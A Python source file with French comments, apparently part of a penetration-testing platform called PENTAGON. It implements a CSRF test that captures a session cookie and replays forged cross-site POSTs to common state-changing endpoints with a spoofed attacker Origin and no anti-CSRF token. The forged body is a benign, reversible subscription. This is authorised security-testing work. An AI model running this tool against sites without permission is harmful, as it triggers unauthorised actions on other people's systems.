"""
Outil de test de falsification de requête inter-site (CSRF) pour PENTAGON.

Prouve, PAR ATTAQUE RÉELLE mais NON DESTRUCTIVE, qu'une action qui CHANGE L'ÉTAT
et qui est authentifiée par un simple cookie de session ambiant peut être
déclenchée depuis un site tiers, faute de protection anti-CSRF (jeton, contrôle
d'origine, cookie `SameSite`).

Méthode (boîte noire, offensive, bornée à la preuve) :
  1. On amorce une session sur la cible (GET) et on capture le cookie de session.
     Si aucun cookie n'est posé, l'application n'est pas authentifiée par cookie
     → CSRF non applicable (les API à jeton Bearer ne sont pas concernées).
  2. On vérifie que ce cookie est posé SANS attribut `SameSite` (précondition
     d'exploitabilité inter-site).
  3. On rejoue l'action d'état (POST) en se faisant passer pour une requête
     INTER-SITE : en-têtes `Origin`/`Referer` d'un domaine tiers, corps
     `x-www-form-urlencoded`, AUCUN jeton anti-CSRF ni en-tête personnalisé.
  4. Si l'action réussit (2xx + changement d'état constaté) alors qu'elle a été
     émise sans jeton depuis une origine tierce, la CSRF est PROUVÉE.

GARDE-FOU « prouver, jamais ravager » : l'action rejouée est anodine et
réversible (abonnement/préférence) — on prouve l'absence de protection, pas
davantage. Aucune donnée réelle d'utilisateur n'est touchée.

Conçu pour être GÉNÉRIQUE : aucune donnée spécifique à une cible.

Catégorie d'action RoE : exploitation (outil offensif).
Standards :
- OWASP A01:2021 (Broken Access Control) — Cross-Site Request Forgery
- OWASP WSTG-SESS-05 (Testing for Cross Site Request Forgery)
- CWE-352 (Cross-Site Request Forgery)
"""

from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse


DEFAULT_TIMEOUT = 15

# Origine tierce (attaquant) usurpée pour simuler une requête inter-site.
ATTACKER_ORIGIN = "https://pentagon-csrf-test.example"

# Chemins d'action « à état » courants (sondés même sans découverte).
COMMON_STATE_PATHS = ["/api/newsletter", "/newsletter", "/api/subscribe",
                      "/subscribe", "/api/preferences", "/api/account/email",
                      "/api/profile", "/api/settings"]

# Chemins d'amorçage de session (pour obtenir le cookie ambiant).
SESSION_PRIME_PATHS = ["/api/session", "/api/newsletter/status", "/"]

# Indices qu'un endpoint découvert est une action « à état » (POST).
STATE_HINTS = ("newsletter", "subscribe", "preference", "setting", "profile",
               "account", "follow", "vote", "like", "email", "update")

# Corps anodin et réversible envoyé à l'action (aucune donnée réelle).
FORGED_BODY = {"email": "pentagon-csrf@test.example", "subscribe": "1"}

# Marqueurs d'un changement d'état réussi dans la réponse.
STATE_CHANGE_MARKERS = ('"subscribed":true', '"subscribed": true', '"updated"',
                        '"success":true', '"success": true', '"ok":true',
                        '"ok": true', '"status":"ok"')


def _base_origin(url: str) -> str:
    """Origine (scheme://host[:port]) d'une URL ou d'un domaine."""
    p = urlparse(url if url.startswith("http") else f"https://{url}")
    return f"{p.scheme}://{p.netloc}"


def _samesite_missing(set_cookie_header: str) -> bool:
    """
    Vrai si un en-tête Set-Cookie pose un cookie SANS attribut `SameSite`
    (précondition d'une exploitation CSRF inter-site).
    """
    if not set_cookie_header:
        return False
    return "samesite" not in set_cookie_header.lower()


def _looks_state_changed(text: str) -> bool:
    """Vrai si la réponse signale un changement d'état réussi."""
    if not text:
        return False
    low = text.lower().replace(" ", "")
    return any(m.replace(" ", "") in low for m in STATE_CHANGE_MARKERS)


def _candidate_endpoints(target_base: str,
                         candidate_urls: list[str] | None) -> list[str]:
    """Chemins d'action à état courants + endpoints découverts pertinents."""
    origin = _base_origin(target_base)
    endpoints: list[str] = [origin + p for p in COMMON_STATE_PATHS]
    seen = set(endpoints)
    for url in candidate_urls or []:
        u = url if url.startswith("http") else origin + (url if url.startswith("/") else "/" + url)
        u = u.split("?", 1)[0]
        if any(h in u.lower() for h in STATE_HINTS) and u not in seen:
            endpoints.append(u)
            seen.add(u)
    return endpoints


def run_csrf_test(target_base: str,
                  candidate_urls: list[str] | None = None,
                  token: str | None = None,
                  timeout: int = DEFAULT_TIMEOUT,
                  delay_between_requests: float = 0.3) -> dict[str, Any]:
    """
    Teste la falsification de requête inter-site (CSRF) sur des candidats.

    Returns:
        {
          "status": "success" | "error",
          "tested_endpoints": [...],
          "findings": [{title, severity, affected_endpoint, evidence, owasp,
                        cwe, confidence}],
          "vulnerable": bool,
          "error": "..."
        }
    """
    import time
    import requests  # import différé (tool offensif exécuté sur la plateforme)

    result: dict[str, Any] = {
        "status": "success",
        "tested_endpoints": [],
        "findings": [],
        "vulnerable": False,
        "error": None,
    }

    origin = _base_origin(target_base)
    endpoints = _candidate_endpoints(target_base, candidate_urls)
    result["tested_endpoints"] = endpoints

    findings: list[dict[str, Any]] = []
    started = datetime.now(timezone.utc)

    for endpoint in endpoints:
        session = requests.Session()
        session.headers.update({"User-Agent": "PENTAGON-Exploitation-Agent/1.0"})

        # 1. Amorçage de session : on cherche un cookie ambiant.
        cookie_set_header = ""
        for prime in SESSION_PRIME_PATHS:
            try:
                r = session.get(origin + prime, timeout=timeout, allow_redirects=False)
            except requests.exceptions.RequestException:
                continue
            finally:
                time.sleep(delay_between_requests)
            sc = r.headers.get("Set-Cookie", "")
            if sc and not cookie_set_header:
                cookie_set_header = sc
            if session.cookies:
                break

        # Pas de cookie de session → authentification non basée cookie → la CSRF
        # ne s'applique pas (ex. API à jeton Bearer). On passe au suivant.
        if not session.cookies:
            continue

        # 2. Requête forgée INTER-SITE : Origin/Referer tiers, aucun jeton.
        forged_headers = {
            "Origin": ATTACKER_ORIGIN,
            "Referer": ATTACKER_ORIGIN + "/",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = session.post(endpoint, data=FORGED_BODY, headers=forged_headers,
                                 timeout=timeout, allow_redirects=False)
        except requests.exceptions.RequestException:
            continue
        finally:
            time.sleep(delay_between_requests)

        changed = 200 <= resp.status_code < 300 and _looks_state_changed(resp.text or "")

        # 3. Confirmation facultative via un endpoint d'état (/status).
        if not changed and 200 <= resp.status_code < 300:
            try:
                st = session.get(endpoint.rstrip("/") + "/status",
                                 timeout=timeout, allow_redirects=False)
                changed = _looks_state_changed(st.text or "")
            except requests.exceptions.RequestException:
                pass
            finally:
                time.sleep(delay_between_requests)

        if changed:
            samesite_note = ("cookie de session sans attribut SameSite"
                             if _samesite_missing(cookie_set_header)
                             else "cookie de session ambiant")
            findings.append({
                "title": "Falsification de requête inter-site (CSRF)",
                "severity": "medium",
                "affected_endpoint": endpoint,
                "param": None,
                "payload": "POST inter-site sans jeton anti-CSRF",
                "evidence": (f"Action d'état exécutée via une requête inter-site "
                             f"(Origin {ATTACKER_ORIGIN}) sans jeton anti-CSRF ; "
                             f"{samesite_note}"),
                "owasp": "A01:2021",
                "cwe": "CWE-352",
                "confidence": 0.85,
            })
            result["vulnerable"] = True

    result["findings"] = findings
    result["duration_seconds"] = (datetime.now(timezone.utc) - started).total_seconds()
    return result


if __name__ == "__main__":
    import json
    import sys
    base = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    print(json.dumps(run_csrf_test(base), indent=2, ensure_ascii=False, default=str))
